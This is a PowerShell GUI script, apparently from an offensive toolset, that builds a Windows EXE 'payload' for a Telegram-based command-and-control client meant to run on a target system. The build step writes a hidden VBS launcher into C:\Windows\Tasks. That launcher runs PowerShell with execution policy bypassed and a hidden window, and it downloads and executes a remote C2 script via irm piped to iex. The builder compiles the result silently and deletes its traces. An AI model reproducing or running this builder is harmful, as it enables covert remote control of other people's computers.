<#
============================================= Beigeworm's Telegram C2 Client Builder GUI ========================================================

SYNOPSIS
This is an easy to use builder application for the c2 client payload - Creates your own EXE file payload for windows systems.

USAGE
Run this script and input the relevant info, then click build and run the exe on a target system. 

#>

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName Microsoft.VisualBasic
[System.Windows.Forms.Application]::EnableVisualStyles()

$MainWindow = New-Object System.Windows.Forms.Form
$MainWindow.ClientSize = '435,200'
$MainWindow.Text = "| BeigeTools | Telegram C2 Client Builder |"
$MainWindow.BackColor = "#242424"
$MainWindow.Opacity = 1
$MainWindow.TopMost = $true
$MainWindow.Icon = [System.Drawing.Icon]::ExtractAssociatedIcon("C:\Windows\System32\DevicePairingWizard.exe")

$outputHeader = New-Object System.Windows.Forms.Label
$outputHeader.Text = "Output Path EXE"
$outputHeader.ForeColor = "#bcbcbc"
$outputHeader.AutoSize = $true
$outputHeader.Width = 25
$outputHeader.Height = 10
$outputHeader.Location = New-Object System.Drawing.Point(15, 118)
$outputHeader.Font = 'Microsoft Sans Serif,10,style=Bold'

$outputbox = New-Object System.Windows.Forms.TextBox
$outputbox.Location = New-Object System.Drawing.Point(20, 138)
$outputbox.BackColor = "#eeeeee"
$outputbox.Width = 280
$outputbox.Height = 45
$outputbox.Text = "Build.exe"
$outputbox.Multiline = $false
$outputbox.Font = 'Microsoft Sans Serif,10,style=Bold'

$TextboxInputHeader = New-Object System.Windows.Forms.Label
$TextboxInputHeader.Text = "Telegram Token"
$TextboxInputHeader.ForeColor = "#bcbcbc"
$TextboxInputHeader.AutoSize = $true
$TextboxInputHeader.Width = 25
$TextboxInputHeader.Height = 10
$TextboxInputHeader.Location = New-Object System.Drawing.Point(15, 15)
$TextboxInputHeader.Font = 'Microsoft Sans Serif,10,style=Bold'

$TextBoxInput = New-Object System.Windows.Forms.TextBox
$TextBoxInput.Location = New-Object System.Drawing.Point(20, 35)
$TextBoxInput.BackColor = "#eeeeee"
$TextBoxInput.Width = 400
$TextBoxInput.Height = 45
$TextBoxInput.Text = ""
$TextBoxInput.Multiline = $False
$TextBoxInput.Font = 'Microsoft Sans Serif,10,style=Bold'

$ParentInputHeader = New-Object System.Windows.Forms.Label
$ParentInputHeader.Text = "Parent Script URL"
$ParentInputHeader.ForeColor = "#bcbcbc"
$ParentInputHeader.AutoSize = $true
$ParentInputHeader.Width = 25
$ParentInputHeader.Height = 10
$ParentInputHeader.Location = New-Object System.Drawing.Point(15, 63)
$ParentInputHeader.Font = 'Microsoft Sans Serif,10,style=Bold'

$ParentInput = New-Object System.Windows.Forms.TextBox
$ParentInput.Location = New-Object System.Drawing.Point(20, 83)
$ParentInput.BackColor = "#eeeeee"
$ParentInput.Width = 400
$ParentInput.Height = 45
$ParentInput.Text = "https://raw.githubusercontent.com/beigew0rm/PoshGram-C2/main/Telegram-C2-Client.ps1"
$ParentInput.Multiline = $False
$ParentInput.Font = 'Microsoft Sans Serif,10,style=Bold'

$StartBuild = New-Object System.Windows.Forms.Button
$StartBuild.Text = "Build"
$StartBuild.Width = 100
$StartBuild.Height = 30
$StartBuild.Location = New-Object System.Drawing.Point(310, 135)
$StartBuild.Font = 'Microsoft Sans Serif,10,style=Bold'
$StartBuild.BackColor = "#eeeeee"

$MainWindow.controls.AddRange(@($TextboxInputHeader, $TextboxInput, $outputHeader, $outputbox, $ParentInputHeader, $ParentInput, $StartBuild))

$ps2exe = "https://raw.githubusercontent.com/beigew0rm/assets/main/Scripts/ps2exe.ps1"
$tempps2exe = "C:\Windows\Tasks\ps2exe.ps1"
$tempc2client = "C:\Windows\Tasks\tgc2_1.ps1"

$StartBuild.Add_Click({

$TextBox = $TextBoxInput.Text
$outEXE = $outputbox.Text

"`$tg = `"$TextBox`"" | Out-File -FilePath $tempc2client -Force
"`$tobat = @`"" | Out-File -FilePath $tempc2client -Append
"Set WshShell = WScript.CreateObject(```"WScript.Shell```")" | Out-File -FilePath $tempc2client -Append
"WScript.Sleep 200" | Out-File -FilePath $tempc2client -Append
"WshShell.Run ```"powershell.exe -NonI -NoP -Ep Bypass -W H -C ```$tg='`$tg'; irm https://raw.githubusercontent.com/beigew0rm/PoshGram-C2/main/Telegram-C2-Client.ps1 | iex```", 0, True" | Out-File -FilePath $tempc2client -Append
"`"@" | Out-File -FilePath $tempc2client -Append

'$pth = "C:\Windows\Tasks\service.vbs";$tobat | Out-File -FilePath $pth -Force ;& $pth;Sleep 5;rm -Path $pth' | Out-File -FilePath $tempc2client -Append

sleep 2
i`wr -Uri $ps2exe -OutFile $tempps2exe
sleep 2
C:\Windows\Tasks\ps2exe.ps1 -inputFile $tempc2client -OutputFile $outEXE -noConsole -noError -noOutput
sleep 5
$ErrorActionPreference = 'SilentlyContinue'
$outEXEtest = Get-Content -Path $outEXE
sleep 1
if($outEXEtest.Length -lt 1){
$Butt = [System.Windows.MessageBoxButton]::OK
$Errors = [System.Windows.MessageBoxImage]::Error
$Asking = 'Build Failed!'
[System.Windows.MessageBox]::Show($Asking, " Error", $Butt, $Errors)
}else{
$Butt = [System.Windows.MessageBoxButton]::OK
$Errors = [System.Windows.MessageBoxImage]::Information
$Asking = 'Build Succeded!'
[System.Windows.MessageBox]::Show($Asking, " Completed", $Butt, $Errors)
}

rm -Path $tempc2client -Force
rm -Path $tempps2exe -Force
})

$MainWindow.ShowDialog()
exit 
